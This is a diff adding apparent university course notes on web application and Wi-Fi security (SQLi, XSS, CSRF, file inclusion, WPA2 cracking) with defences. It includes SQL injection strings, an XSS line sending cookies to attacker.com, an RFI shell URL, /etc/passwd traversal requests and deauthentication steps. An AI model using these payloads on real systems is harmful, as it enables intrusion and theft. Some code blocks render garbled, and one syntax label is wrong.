@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Ethical Hacking - Unit 4 WebApp & Wireless Security Visual Notes</title>
+<style>
+  @page {
+    size: A4 portrait;
+    margin: 12mm 12mm 12mm 12mm;
+    @bottom-right {
+      content: counter(page);
+    }
+  }
+
+  *, *:before, *:after {
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    font-size: 8.8pt;
+    line-height: 1.40;
+    color: #1e293b;
+    background-color: #ffffff;
+    margin: 0;
+    padding: 0;
+  }
+
+  .avoid-break {
+    page-break-inside: avoid;
+    break-inside: avoid;
+    margin-bottom: 12px;
+  }
+
+  h1 {
+    font-size: 14pt;
+    font-weight: 800;
+    color: #0f172a;
+    border-bottom: 2px solid #dc2626;
+    padding-bottom: 4px;
+    margin-top: 10px;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  h2 {
+    font-size: 11.5pt;
+    font-weight: 700;
+    color: #991b1b;
+    margin-top: 14px;
+    margin-bottom: 6px;
+    border-bottom: 1.5px solid #cbd5e1;
+    padding-bottom: 3px;
+  }
+
+  h3 {
+    font-size: 10pt;
+    font-weight: 700;
+    color: #b91c1c;
+    margin-top: 10px;
+    margin-bottom: 4px;
+    border-left: 3.5px solid #dc2626;
+    padding-left: 6px;
+  }
+
+  h4 {
+    font-size: 9pt;
+    font-weight: 700;
+    color: #475569;
+    margin-top: 6px;
+    margin-bottom: 3px;
+  }
+
+  p {
+    margin: 3px 0 5px 0;
+  }
+
+  blockquote {
+    border-left: 3.5px solid #dc2626;
+    background-color: #fef2f2;
+    padding: 6px 10px;
+    margin: 6px 0;
+    font-size: 8.5pt;
+    color: #991b1b;
+    border-radius: 0 4px 4px 0;
+  }
+
+  blockquote p {
+    margin: 2px 0;
+  }
+
+  pre {
+    background-color: #0f172a;
+    color: #f8fafc;
+    padding: 6px 8px;
+    border-radius: 4px;
+    font-family: "Cascadia Code", "Consolas", "Courier New", monospace;
+    font-size: 7.3pt;
+    line-height: 1.30;
+    overflow-x: auto;
+    margin: 5px 0;
+    page-break-inside: avoid;
+    break-inside: avoid;
+    border: 1px solid #334155;
+  }
+
+  code {
+    font-family: "Cascadia Code", "Consolas", "Courier New", monospace;
+    font-size: 8.0pt;
+    background-color: #f1f5f9;
+    color: #b91c1c;
+    padding: 1px 3px;
+    border-radius: 3px;
+    border: 1px solid #e2e8f0;
+  }
+
+  pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    border: none;
+    font-size: inherit;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 5px 0;
+    font-size: 8.0pt;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  th, td {
+    border: 1px solid #cbd5e1;
+    padding: 3px 5px;
+    text-align: left;
+    vertical-align: top;
+  }
+
+  th {
+    background-color: #f1f5f9;
+    font-weight: 700;
+    color: #0f172a;
+  }
+
+  tr:nth-child(even) td {
+    background-color: #f8fafc;
+  }
+
+  ul, ol {
+    margin: 3px 0 5px 16px;
+    padding: 0;
+  }
+
+  li {
+    margin-bottom: 2px;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed #cbd5e1;
+    margin: 8px 0;
+  }
+
+  .visual-card {
+    background-color: #ffffff;
+    border: 1.5px solid #e2e8f0;
+    border-radius: 6px;
+    padding: 8px;
+    margin: 10px 0;
+    text-align: center;
+    page-break-inside: avoid;
+    break-inside: avoid;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+  }
+
+  .visual-card img {
+    max-width: 95%;
+    max-height: 280px;
+    height: auto;
+    border-radius: 4px;
+    display: block;
+    margin: 0 auto;
+    border: 1px solid #cbd5e1;
+  }
+
+  .visual-card .caption {
+    font-size: 8pt;
+    font-weight: 600;
+    color: #475569;
+    margin-top: 6px;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+<h1>Unit IV: Web Application and Wireless Security</h1>
+<p><strong>Course</strong>: Ethical Hacking (MD<strong><em>) | </strong>VIT Pune</em>*  </p>
+<p><strong>Faculty / Curriculum</strong>: AY 2026-27 | <strong>Exam Date</strong>: 27 Nov 2026</p>
+<br>
+<hr>
+<br>
+<h2>1. Web Architecture: HTTP vs HTTPS</h2>
+<br>
+<p>Web applications operate on client-server architectures using the Hypertext Transfer Protocol.</p>
+<br>
+<div class="avoid-break"><pre><code>+---------------------------------------------------------------------------------------+
+|                                  HTTP vs HTTPS COMPARISON                             |
++-------------------------------------------+-------------------------------------------+
+|         HTTP (Hypertext Transfer)         |         HTTPS (HTTP over TLS/SSL)         |
++-------------------------------------------+-------------------------------------------+
+| * Operates on TCP Port 80.                | * Operates on TCP Port 443.               |
+| * Transmits data in cleartext.            | * Encrypts payload via TLS 1.2 / TLS 1.3. |
+| * Vulnerable to packet sniffing and MITM. | * Provides Confidentiality &amp; Integrity.   |
+| * Zero authentication of server identity. | * Authenticates server via X.509 PKI cert.|
++-------------------------------------------+-------------------------------------------+</code></pre></div>
+<br>
+<div class="avoid-break"><h3>1.1 The TLS Handshake & Cryptographic Foundations</h3>
+<p>When a client connects to <code>https://target.com</code>:</p>
+<p>1. <strong>ClientHello</strong>: Transmits supported TLS version, supported cryptographic cipher suites, and a client random nonce.</p>
+<p>2. <strong>ServerHello</strong>: Chooses cipher suite (e.g., <code>TLS_AES_256_GCM_SHA384</code>), provides server random nonce, and sends its public <strong>X.509 Digital Certificate</strong> signed by a trusted Certificate Authority (CA).</p>
+<p>3. <strong>Key Exchange (ECDHE)</strong>: Elliptic Curve Diffie-Hellman Ephemeral exchange establishes a shared session master secret, providing <strong>Perfect Forward Secrecy (PFS)</strong>.</p>
+<p>4. <strong>Finished</strong>: Both parties switch to symmetric AES-GCM encryption for all application HTTP payloads.</p>
+<br>
+<hr>
+<br>
+<h2>2. OWASP Top 10 Web Application Vulnerabilities</h2>
+<br>
+<div class="visual-card">
+  <img src="../Images/Unit4/image8.png" alt="OWASP Top 10 Slide" />
+  <div class="caption">Figure 4.1: Faculty Lecture Slide Visual - OWASP Top 10 Web Application Security Risks</div>
+</div>
+<br>
+<br>
+<p>The Open Web Application Security Project (OWASP) Top 10 represents the authoritative global consensus on the most critical security risks facing web applications.</p>
+<br>
+<div class="avoid-break"><pre><code>+---------------------------------------------------------------------------------------+
+|                       OWASP TOP 10 (2025 vs 2021 ARCHITECTURE)                        |
++--------+------------------------------------+-----------------------------------------+
+| Rank   | OWASP Top 10: 2025 (Finalized)     | Core Root Cause &amp; High-Yield Prevention |
++--------+------------------------------------+-----------------------------------------+
+| **A01**| Broken Access Control              | Unauthorized data access / IDOR / SSRF. |
+|        |                                    | Fix: Enforce server-side checks; PoLP.  |
++--------+------------------------------------+-----------------------------------------+
+| **A02**| Security Misconfiguration          | Default passwords, verbose stack traces.|
+|        |                                    | Fix: Hardened baseline; disable debug.  |
++--------+------------------------------------+-----------------------------------------+
+| **A03**| Injection (SQLi, Command, LDAP)    | Concatenating untrusted input to query. |
+|        |                                    | Fix: Parameterized Prepared Statements. |
++--------+------------------------------------+-----------------------------------------+
+| **A04**| Cryptographic Failures             | Cleartext transmission, weak MD5/DES.   |
+|        |                                    | Fix: TLS 1.3, AES-256, salted Argon2id. |
++--------+------------------------------------+-----------------------------------------+
+| **A05**| Insecure Design                    | Architecture flaws, lack of threat model|
+|        |                                    | Fix: Threat modeling, defense-in-depth. |
++--------+------------------------------------+-----------------------------------------+
+| **A06**| Vulnerable &amp; Outdated Components   | Using libraries with known CVEs (Log4j).|
+|        |                                    | Fix: SCA scanning, automated patching.  |
++--------+------------------------------------+-----------------------------------------+
+| **A07**| Identification &amp; Auth Failures     | Weak passwords, missing MFA, session fix|
+|        |                                    | Fix: Mandatory MFA, rate-limiting.     |
++--------+------------------------------------+-----------------------------------------+
+| **A08**| Software &amp; Data Integrity Failures | Insecure deserialization, unsigned code.|
+|        |                                    | Fix: Digital signatures, secure CI/CD.  |
++--------+------------------------------------+-----------------------------------------+
+| **A09**| Security Logging &amp; Monitoring      | Missing audit trails, unmonitored logs. |
+|        |                                    | Fix: Centralized SIEM, real-time alerts.|
++--------+------------------------------------+-----------------------------------------+
+| **A10**| Server-Side Request Forgery (SSRF) | Server fetching attacker-supplied URL.  |
+|        | *(Note: Folded into A01 in 2025)*  | Fix: Egress filtering, metadata service.|
++--------+------------------------------------+-----------------------------------------+</code></pre></div>
+<br>
+<hr>
+<br>
+<h2>3. SQL Injection (SQLi)</h2>
+<br>
+<div class="visual-card">
+  <img src="../Diagrams/EH_Unit4_Diagram1_SQL_Injection_Defense.png" alt="SQL Injection Defense" />
+  <div class="caption">Figure 4.2: SQL Injection Attack Transformation & Parameterized Prepared Statement Defense</div>
+</div>
+<div class="visual-card">
+  <img src="../Images/Unit4/image10.png" alt="SQL Injection Slide" />
+  <div class="caption">Figure 4.3: Faculty Lecture Slide Visual - SQLi Query Concatenation Vulnerability</div>
+</div>
+<br>
+<br>
+<p>SQL Injection occurs when untrusted user-supplied input is directly concatenated into a dynamic database query string, allowing an attacker to manipulate query structure and logic.</p>
+<br>
+<div class="avoid-break"><pre><code>Vulnerable Code:
+query = "SELECT * FROM users WHERE user = '" + input_user + "' AND pass = '" + input_pass + "'";
+
+Attacker Input:
+input_user = admin' --
+input_pass = irrelevant
+
+Resulting Executed Query:
+SELECT * FROM users WHERE user = 'admin' --' AND pass = 'irrelevant'
+                                        │
+                                        └── Everything after '--' is ignored as comment!</code></pre></div>
+<br>
+<div class="avoid-break"><h3>3.1 SQL Injection Categories & Classification</h3>
+<br>
+<h4>1. In-Band (Classic) SQLi</h4>
+<p>The attacker uses the same communication channel to launch the attack and retrieve results:</p>
+<p>* <strong>Tautology / Authentication Bypass</strong>:</p>
+<p>  * Input: <code>' OR 1=1 --</code></p>
+<p>  <em> Query: <code>SELECT </em> FROM products WHERE category = '' OR 1=1 --'</code> (Returns all rows because <code>1=1</code> is unconditionally TRUE).</p>
+<p>* <strong>UNION-Based SQLi</strong>:</p>
+<p>  * Appends the results of an attacker-crafted query to the original query results using the <code>UNION</code> operator:</p>
+<p>  <em> </em>Step 1: Determine column count*: <code>' ORDER BY 1--</code>, <code>' ORDER BY 2--</code> until error.</p>
+<p>  <em> </em>Step 2: Extract data*:</p>
+<p>    <code></code>`sql</p>
+<p>    ' UNION SELECT 1, username, password FROM users--</p>
+<p>    <code></code>`</p>
+<br>
+<h4>2. Inferential (Blind) SQLi</h4>
+<p>The application returns no database error messages or extracted data in the HTTP response. The attacker reconstructs data character-by-character by observing server behavior:</p>
+<p>* <strong>Boolean-Based Blind SQLi</strong>:</p>
+<p>  * Attacker submits conditions that evaluate to True or False:</p>
+<p>    <code></code>`sql</p>
+<p>    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --</p>
+<p>    <code></code>`</p>
+<p>  * If the page renders normally $\rightarrow$ character is 'a'. If page renders differently $\rightarrow$ character is not 'a'.</p>
+<p>* <strong>Time-Based Blind SQLi</strong>:</p>
+<p>  * Attacker injects database sleep functions to induce deliberate processing delays:</p>
+<p>    <code></code>`sql</p>
+<p>    # PostgreSQL / MySQL:</p>
+<p>    ' OR IF(1=1, SLEEP(5), 0) --</p>
+<p>    # Microsoft SQL Server:</p>
+<p>    '; IF (1=1) WAITFOR DELAY '0:0:5' --</p>
+<p>    <code></code>`</p>
+<p>  * If the HTTP response arrives after 5 seconds, the evaluated condition was True.</p>
+<br>
+<h4>3. Out-of-Band SQLi</h4>
+<p>Used when direct response channels are disabled and server processing is asynchronous. The injected payload forces the database server to initiate an external DNS lookup or HTTP request back to the attacker’s listener (e.g., <code>xp_dirtree</code> in MSSQL querying <code>\\attacker-ip\share</code> or Oracle <code>UTL_HTTP</code>).</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>3.2 SQLi Defense: Parameterized Queries (Prepared Statements)</h3>
+<br>
+<p>The only complete, structural defense against SQL injection is the strict separation of <strong>code (query structure)</strong> from <strong>data (user input)</strong>.</p>
+<br>
+<div class="avoid-break"><pre><code># SECURE IMPLEMENTATION (Python DB-API / SQLite / PostgreSQL):
+cursor.execute(
+    "SELECT * FROM users WHERE username = %s AND password = %s",
+    (input_user, input_pass) # Parameters passed separately from SQL string
+)</code></pre></div>
+<br>
+<div class="avoid-break"><pre><code>// SECURE IMPLEMENTATION (Java JDBC PreparedStatement):
+String sql = "SELECT * FROM accounts WHERE user_id = ?";
+PreparedStatement stmt = connection.prepareStatement(sql);
+stmt.setString(1, userId);
+ResultSet rs = stmt.executeQuery();</code></pre></div>
+<br>
+<p><em> <strong>How it Works</strong>: The database compiler pre-compiles the SQL syntax tree </em>before* parameter values are bound. When user input containing <code>' OR '1'='1</code> is supplied, the database treats the entire input strictly as a literal scalar string, never as executable SQL tokens.</p>
+<p>* <strong>Secondary Defenses</strong>: Object-Relational Mapping (ORM) frameworks (e.g., Hibernate, SQLAlchemy), database user least-privilege, and Web Application Firewalls (WAF).</p>
+<br>
+<hr>
+<br>
+<h2>4. Cross-Site Scripting (XSS)</h2>
+<br>
+<div class="visual-card">
+  <img src="../Diagrams/EH_Unit4_Diagram2_XSS_Typology.png" alt="XSS Typology" />
+  <div class="caption">Figure 4.4: Cross-Site Scripting Typology (Reflected, Stored, DOM-based XSS)</div>
+</div>
+<div class="visual-card">
+  <img src="../Images/Unit4/image13.png" alt="XSS Script Execution Slide" />
+  <div class="caption">Figure 4.5: Faculty Lecture Slide Visual - Browser Script Injection & Cookie Theft</div>
+</div>
+<br>
+<br>
+<p>XSS occurs when a web application includes unvalidated and unencoded user input within its web page output, allowing an attacker to execute arbitrary client-side JavaScript in a victim's browser.</p>
+<br>
+<div class="avoid-break"><pre><code>+---------------------------------------------------------------------------------------+
+|                                    XSS CLASSIFICATION                                 |
++---------------------------+---------------------------+-------------------------------+
+|       REFLECTED XSS       |         STORED XSS        |         DOM-BASED XSS         |
+|      (Non-Persistent)     |        (Persistent)       |        (Client-Side)          |
++---------------------------+---------------------------+-------------------------------+
+| * Injected via URL query. | * Injected into database. | * Vulnerability in client JS. |
+| * Reflected immediately.  | * Served to all visitors. | * Server never sees payload!  |
+| * Delivered via Phishing. | * High impact (Forums).   | * Source: document.location   |
+|                           |                           | * Sink: innerHTML, eval()     |
++---------------------------+---------------------------+-------------------------------+</code></pre></div>
+<br>
+<div class="avoid-break"><h3>4.1 Detailed Mechanics</h3>
+<br>
+<h4>1. Reflected XSS (Type I)</h4>
+<p>* <strong>Flow</strong>: Attacker crafts a poisoned link: <code>http://bank.com/search?q=&lt;script>fetch('http://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</code>.</p>
+<p>* When the victim clicks the link, the server reflects the <code>q</code> parameter directly into the HTML response without encoding.</p>
+<p>* The victim's browser executes the script in the context of <code>bank.com</code>.</p>
+<br>
+<h4>2. Stored XSS (Type II - Most Dangerous)</h4>
+<p>* <strong>Flow</strong>: Attacker posts a comment on a blog or customer review field containing <code>&lt;script data-disabled-src="http://evil.com/hook.js">&lt;/script&gt;</code>.</p>
+<p>* The application stores the payload directly into the database.</p>
+<p>* Every subsequent user who views the page receives the payload from the database and executes the malicious script automatically.</p>
+<br>
+<h4>3. DOM-Based XSS (Type 0)</h4>
+<p>* <strong>Flow</strong>: The vulnerability exists entirely within client-side JavaScript code.</p>
+<p>* The application reads data from an unvalidated <strong>DOM Source</strong> (e.g., <code>location.search</code>, <code>location.hash</code>) and writes it to an unsafe <strong>DOM Sink</strong> (e.g., <code>document.write()</code>, <code>element.innerHTML</code>, <code>eval()</code>):</p>
+<p>  <code></code>`javascript</p>
+<p>  // VULNERABLE DOM SCRIPT:</p>
+<p>  let search = location.search.substring(1);</p>
+<p>  document.getElementById("output").innerHTML = "Results for: " + search;</p>
+<p>  <code></code>`</p>
+<p>* Because the URL fragment (<code>#payload</code>) is processed locally by the browser, the payload is never even transmitted to the web server!</p>
+<br>
+<div class="avoid-break"><h3>4.2 Comprehensive XSS Defenses</h3>
+<p>1. <strong>Contextual Output Encoding</strong>: Encode untrusted data immediately before writing it into HTML body (<code>&lt;script&gt;</code>), JavaScript variables, attributes, or CSS.</p>
+<p>2. <strong>Content Security Policy (CSP)</strong>: HTTP response header restricting script execution sources:</p>
+<p>   <code></code>`http</p>
+<p>   Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;</p>
+<p>   <code></code>`</p>
+<p>   Completely blocks inline scripts (<code>&lt;script>alert(1)&lt;/script&gt;</code>) and unauthorized external scripts.</p>
+<p>3. <strong><code>HttpOnly</code> Cookie Flag</strong>: Prevents JavaScript from reading session cookies via <code>document.cookie</code>.</p>
+<br>
+<hr>
+<br>
+<h2>5. Cross-Site Request Forgery (CSRF) & Web Defenses</h2>
+<br>
+<div class="visual-card">
+  <img src="../Diagrams/EH_Unit4_Diagram3_CSRF_Mechanism_Defense.png" alt="CSRF Mechanism" />
+  <div class="caption">Figure 4.6: Cross-Site Request Forgery (CSRF) Execution & Synchronizer Anti-CSRF Token Defense</div>
+</div>
+<div class="visual-card">
+  <img src="../Images/Unit4/image14.png" alt="CSRF Flow Slide" />
+  <div class="caption">Figure 4.7: Faculty Lecture Slide Visual - Ambient Cookie Exploitation & Request Forgery</div>
+</div>
+<br>
+<br>
+<div class="avoid-break"><h3>5.1 CSRF Mechanics</h3>
+<p>Cross-Site Request Forgery tricks an authenticated victim's web browser into executing an unintended, state-changing HTTP request to a vulnerable web application:</p>
+<p>* <strong>Prerequisites</strong>:</p>
+<p>  1. Victim has an active, authenticated session with <code>bank.com</code> (session cookie stored in browser).</p>
+<p>  2. The application relies strictly on automatic browser cookie transmission for authentication.</p>
+<p>  3. The request parameters are completely predictable.</p>
+<p>* <strong>Attack Scenario</strong>:</p>
+<p>  Attacker hosts a malicious webpage (<code>evil.com</code>) containing an invisible auto-submitting form:</p>
+<p>  <code></code>`html</p>
+<p>  <form action="http://bank.com/transfer" method="POST" id="csrfForm"></p>
+<p>      <input type="hidden" name="toAccount" value="AttackerAccount99" /></p>
+<p>      <input type="hidden" name="amount" value="10000" /></p>
+<p>  </form></p>
+<p>  &lt;script>document.getElementById('csrfForm').submit();&lt;/script&gt;</p>
+<p>  <code></code>`</p>
+<p>  When the victim visits <code>evil.com</code>, the browser automatically attaches the victim’s valid session cookie for <code>bank.com</code> and executes the transfer without the victim's knowledge!</p>
+<br>
+<div class="avoid-break"><pre><code>[ Victim Browser ] ────────── 1. Authenticates &amp; gets Session Cookie ───────► [ bank.com ]
+        │
+        ▼ (Visits evil.com)
+ [ evil.com Page ] ────────── 2. Forges Hidden Transfer POST Request ────────► [ bank.com ]
+                                 (Browser attaches bank.com cookie!)
+                                 * Transfer executed unauthorized!</code></pre></div>
+<br>
+<div class="avoid-break"><h3>5.2 CSRF Countermeasures</h3>
+<p>1. <strong>Anti-CSRF Synchronizer Tokens</strong>:</p>
+<p>   * Server generates a cryptographically random, unpredictable token unique to the current user session.</p>
+<p>   * The token is embedded within HTML forms as a hidden field (<code><input type="hidden" name="csrf_token" value="abc123xyz" /></code>).</p>
+<p>   * Upon submission, the server verifies that the submitted form token matches the token stored in the server session. An external site (<code>evil.com</code>) cannot read this token due to the <strong>Same-Origin Policy (SOP)</strong>.</p>
+<p>2. <strong><code>SameSite</code> Cookie Attribute</strong>:</p>
+<p>   * <code>SameSite=Strict</code>: The browser never sends the cookie in cross-site requests (e.g., following external links or third-party POST forms).</p>
+<p>   * <code>SameSite=Lax</code>: Permits cookie sending only on top-level cross-site GET navigations.</p>
+<p>3. <strong>Re-Authentication for Critical Actions</strong>: Requiring password re-entry or MFA confirmation before executing fund transfers or changing passwords.</p>
+<br>
+<hr>
+<br>
+<h2>6. Directory Traversal, File Inclusion & Security Headers</h2>
+<br>
+<div class="visual-card">
+  <img src="../Images/Unit4/image16.png" alt="File Inclusion Slide" />
+  <div class="caption">Figure 4.8: Faculty Lecture Slide Visual - Local & Remote File Inclusion (LFI/RFI)</div>
+</div>
+<br>
+<br>
+<div class="avoid-break"><h3>6.1 Directory Traversal (Path Traversal)</h3>
+<p>* <strong>Concept</strong>: Exploits insufficient sanitization of file path inputs, utilizing dot-dot-slash (<code>../</code>) sequences to traverse outside the web root directory into restricted OS folders.</p>
+<p>* <strong>Exploitation Example</strong>:</p>
+<p>  <code></code>`http</p>
+<p>  GET /view_image?filename=../../../../etc/passwd HTTP/1.1</p>
+<p>  GET /download?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1</p>
+<p>  <code></code>`</p>
+<p>* <strong>Defense</strong>: Canonicalize file paths using <code>realpath()</code>, validate against an explicit allowlist of filenames, and avoid passing user input directly to filesystem APIs.</p>
+<br>
+<div class="avoid-break"><h3>6.2 Local File Inclusion (LFI) vs Remote File Inclusion (RFI)</h3>
+<p>* <strong>Local File Inclusion (LFI)</strong>: Forces the web server to execute a file residing locally on the system (e.g., Apache log files poisoned with PHP code: <code>?page=/var/log/apache2/access.log</code>).</p>
+<p>* <strong>Remote File Inclusion (RFI)</strong>: Exploits PHP <code>include()</code> or <code>require()</code> statements to load and execute a remote script hosted on an attacker's web server:</p>
+<p>  <code></code>`text</p>
+<p>  http://target.com/index.php?page=http://attacker.com/malicious_shell.txt</p>
+<p>  <code></code>`</p>
+<p>* <strong>Defense</strong>: Disable <code>allow_url_include</code> and <code>allow_url_fopen</code> in <code>php.ini</code>.</p>
+<br>
+<div class="avoid-break"><h3>6.3 Essential HTTP Security Headers</h3>
+<br>
+<div class="avoid-break"><table>
+<thead><tr><th>HTTP Security Header</th><th>Directive Example</th><th>Security Protection</th></tr></thead>
+<tbody>
+<tr><td>**Content-Security-Policy (CSP)**</td><td>`default-src 'self'; script-src 'self' cdn.example.com;`</td><td>Mitigates XSS, packet sniffing, and data injection.</td></tr>
+<tr><td>**Strict-Transport-Security (HSTS)**</td><td>`max-age=31536000; includeSubDomains; preload`</td><td>Forces all connections to HTTPS; defeats SSL-Stripping.</td></tr>
+<tr><td>**X-Frame-Options**</td><td>`DENY` or `SAMEORIGIN`</td><td>Prevents page from being loaded in an `<iframe>` (Clickjacking).</td></tr>
+<tr><td>**X-Content-Type-Options**</td><td>`nosniff`</td><td>Prevents MIME-type sniffing (forces browser to honor Content-Type).</td></tr>
+<tr><td>**Referrer-Policy**</td><td>`strict-origin-when-cross-origin`</td><td>Protects privacy by stripping sensitive URL parameters on external links.</td></tr>
+</tbody></table></div>
+<br>
+<hr>
+<br>
+<h2>7. Wireless Security Architecture & 802.11 Standards</h2>
+<br>
+<div class="avoid-break"><pre><code>                      +-----------------------------+
+                      |       DISTRIBUTION SYSTEM   |
+                      |          (Wired LAN)        |
+                      +-----------------------------+
+                                     │
+                    ┌────────────────┴────────────────┐
+                    ▼                                 ▼
+             [ ACCESS POINT 1 ]                [ ACCESS POINT 2 ]
+              (BSSID: MAC 1)                    (BSSID: MAC 2)
+                    │                                 │
+           ┌────────┴────────┐               ┌────────┴────────┐
+           ▼                 ▼               ▼                 ▼
+        [ STA 1 ]         [ STA 2 ]       [ STA 3 ]         [ STA 4 ]
+        (Client)          (Client)        (Client)          (Client)
+        &lt;────── BSS 1 ───────&gt;            &lt;────── BSS 2 ───────&gt;
+        &lt;──────────────────────── ESS ─────────────────────────&gt;</code></pre></div>
+<br>
+<div class="avoid-break"><h3>7.1 Wi-Fi Architecture Terminology</h3>
+<p>* <strong>Station (STA)</strong>: Any wireless client device equipped with an 802.11 network interface (laptops, smartphones).</p>
+<p>* <strong>Access Point (AP)</strong>: Bridge connecting wireless stations to a wired Ethernet distribution system.</p>
+<p>* <strong>Basic Service Set (BSS)</strong>: An Access Point and its associated wireless stations. Identified by a 48-bit <strong>BSSID</strong> (the AP's physical MAC address).</p>
+<p>* <strong>Extended Service Set (ESS)</strong>: A collection of multiple interconnected BSSs sharing a common <strong>SSID</strong> (Service Set Identifier - the human-readable network name).</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>7.2 Evolution of Wireless Security Protocols</h3>
+<br>
+<div class="visual-card">
+  <img src="../Diagrams/EH_Unit4_Diagram4_WiFi_Security_Evolution.png" alt="Wi-Fi Security Evolution" />
+  <div class="caption">Figure 4.9: Evolution of Wireless Protocols (WEP -> WPA -> WPA2 AES-CCMP -> WPA3 SAE)</div>
+</div>
+<div class="visual-card">
+  <img src="../Images/Unit4/image18.jpeg" alt="Wireless Architecture Slide" />
+  <div class="caption">Figure 4.10: Faculty Lecture Slide Visual - IEEE 802.11 Wireless Architecture & AP Encryption</div>
+</div>
+<br>
+<br>
+<div class="avoid-break"><pre><code>+---------------------------------------------------------------------------------------+
+|                              WI-FI ENCRYPTION PROTOCOLS                               |
++-----------+-----------+-----------------------+---------------------------------------+
+| Protocol  | Cipher    | Integrity Check       | Key Vulnerabilities &amp; Exploit Status  |
++-----------+-----------+-----------------------+---------------------------------------+
+| **WEP**   | RC4       | CRC-32 (Broken)       | 24-bit weak IV, key reuse (FMS attack)|
+| (1997)    | (Stream)  |                       | **COMPLETELY BROKEN (Cracked in sec)**|
++-----------+-----------+-----------------------+---------------------------------------+
+| **WPA**   | RC4 +     | Michael (64-bit MIC)  | Interim patch; vulnerable to Beck-    |
+| (2003)    | TKIP      |                       | Tews and Ohigashi-Morii packet forged |
++-----------+-----------+-----------------------+---------------------------------------+
+| **WPA2**  | AES-CCMP  | CBC-MAC               | 4-Way Handshake captured via Deauth;  |
+| (2004)    | (Block)   |                       | vulnerable to offline dictionary/KRACK|
++-----------+-----------+-----------------------+---------------------------------------+
+| **WPA3**  | AES-GCM   | BIP-GMAC / PMF        | Replaces PSK with **SAE (Dragonfly)**;|
+| (2018)    | (128/192) | (Protected Mgmt Frame)| **Resists offline dictionary attacks**|
++-----------+-----------+-----------------------+---------------------------------------+</code></pre></div>
+<br>
+<h4>1. WEP (Wired Equivalent Privacy)</h4>
+<p>* Uses <strong>RC4 stream cipher</strong> with a static shared master key (40-bit or 104-bit).</p>
+<p>* Prepends a small <strong>24-bit Initialization Vector (IV)</strong> to the key.</p>
+<p>* <strong>Fatal Flaw</strong>: Due to the birthday paradox, IVs repeat within thousands of frames. Weak IV keys allow mathematical reconstruction of the master key using tools like <code>aircrack-ng</code> within 60 seconds.</p>
+<br>
+<h4>2. WPA2 & The 4-Way Handshake Attack</h4>
+<p>WPA2-Personal relies on a Pre-Shared Key (PSK). Mutual authentication and pairwise transient key (PTK) generation occur via the <strong>802.11i 4-Way Handshake</strong>:</p>
+<p>1. AP sends <code>ANonce</code> (Authenticator Nonce) to Client.</p>
+<p>2. Client generates <code>SNonce</code> (Supplicant Nonce), derives <code>PTK = PRF(PSK, ANonce, SNonce, AP_MAC, Client_MAC)</code>, and sends <code>SNonce</code> + <code>MIC</code> to AP.</p>
+<p>3. AP derives PTK, verifies MIC, and sends <code>GTK</code> (Group Temporal Key) + <code>MIC</code> to Client.</p>
+<p>4. Client confirms key installation (<code>ACK</code>).</p>
+<br>
+<p>* <strong>Attack Vector</strong>:</p>
+<p>  * An attacker broadcasts forged <strong>Deauthentication Frames (<code>aireplay-ng -0</code>)</strong> spoofing the AP’s MAC address.</p>
+<p>  * The victim station is disconnected. When the victim automatically reconnects, the attacker captures the 4-way handshake frames using <code>airodump-ng</code>.</p>
+<p>  * The attacker feeds the captured <code>.cap</code> file to Hashcat or John the Ripper to perform an <strong>offline dictionary attack</strong> against the PSK.</p>
+<br>
+<h4>3. WPA3 & Simultaneous Authentication of Equals (SAE)</h4>
+<p>* WPA3 replaces the vulnerable 4-way PSK handshake with <strong>SAE (Dragonfly handshake)</strong>, an adaptation of Diffie-Hellman:</p>
+<p>  * <strong>Zero Password Exposure</strong>: Passwords are never transmitted over the air; eavesdroppers cannot capture a handshake to crack offline.</p>
+<p>  * <strong>Forward Secrecy</strong>: Even if the network passphrase is compromised in the future, past captured sessions cannot be decrypted.</p>
+<p>  * <strong>Mandatory Protected Management Frames (PMF - 802.11w)</strong>: Cryptographically signs management frames, completely preventing spoofed deauthentication attacks!</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>7.3 Wireless Threats & Defenses</h3>
+<br>
+<div class="visual-card">
+  <img src="../Diagrams/EH_Unit4_Diagram5_Wireless_Attacks_EvilTwin.png" alt="Evil Twin Attack" />
+  <div class="caption">Figure 4.11: Rogue AP & Evil Twin Deauthentication MITM Attack</div>
+</div>
+<div class="visual-card">
+  <img src="../Images/Unit4/image20.png" alt="Wireless Threats Slide" />
+  <div class="caption">Figure 4.12: Faculty Lecture Slide Visual - Rogue APs, Deauth Frames & Wireless Best Practices</div>
+</div>
+<br>
+<br>
+<p>1. <strong>Rogue Access Point</strong>:</p>
+<p>   * An unauthorized AP physically plugged into an enterprise Ethernet switch port by an employee or malicious visitor, bypassing perimeter firewalls.</p>
+<p>2. <strong>Evil Twin Attack</strong>:</p>
+<p>   * A fraudulent rogue AP deployed by an attacker configured with the exact same SSID and MAC address as a legitimate enterprise network, operating at higher radio transmission power. Clients connect to the Evil Twin, enabling total traffic sniffing and credential harvesting via captive portals.</p>
+<p>3. <strong>Deauthentication Attack</strong>:</p>
+<p>   * Injecting spoofed 802.11 management frames to kick legitimate stations off the network, used to force credential re-entry or capture handshakes.</p>
+<p>4. <strong>Wireless Hardening Best Practices</strong>:</p>
+<p>   * Migrate to <strong>WPA3-Personal</strong> or <strong>WPA2/WPA3-Enterprise (802.1X with RADIUS and EAP-TLS)</strong>.</p>
+<p>   * Enable <strong>Protected Management Frames (PMF)</strong>.</p>
+<p>   * Deploy <strong>Wireless Intrusion Prevention Systems (WIPS)</strong> to continuously detect and contain rogue APs and evil twins.</p>
